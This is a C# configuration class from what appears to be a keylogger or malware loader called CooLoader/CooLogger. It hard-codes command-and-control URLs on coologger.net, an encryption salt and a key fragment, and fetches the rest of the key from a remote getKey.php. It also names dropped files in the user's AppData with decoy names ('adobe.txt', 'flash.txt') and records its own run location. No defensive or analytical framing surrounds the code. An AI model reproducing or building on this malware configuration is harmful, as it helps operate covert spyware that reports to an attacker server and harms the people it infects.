using System;
using System.Reflection;
using CooLoader.Util.Net;

namespace CooLoader
{
    public static class Configuration
    {
        public static string EncryptionSalt = "CooLogger";
        public static string EncryptionKey = "Z3R0";
        public static string HomeBase = "http://coologger.net/func/";
        public static string AltBase = "http://coologger.net/alt/";

        public static double LocalVersion = 3.1;
        public static string AppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static string CrackerFileUno = AppData + "\\adobe.txt";
        public static string CrackerFileDos = AppData + "\\flash.txt";
        public static string RunningLocation = Assembly.GetExecutingAssembly().Location;

        public static string GetEncryptionKey()
        {
            return EncryptionKey + RemoteSettings.GrabSetting("getKey.php");    
        }
    }
}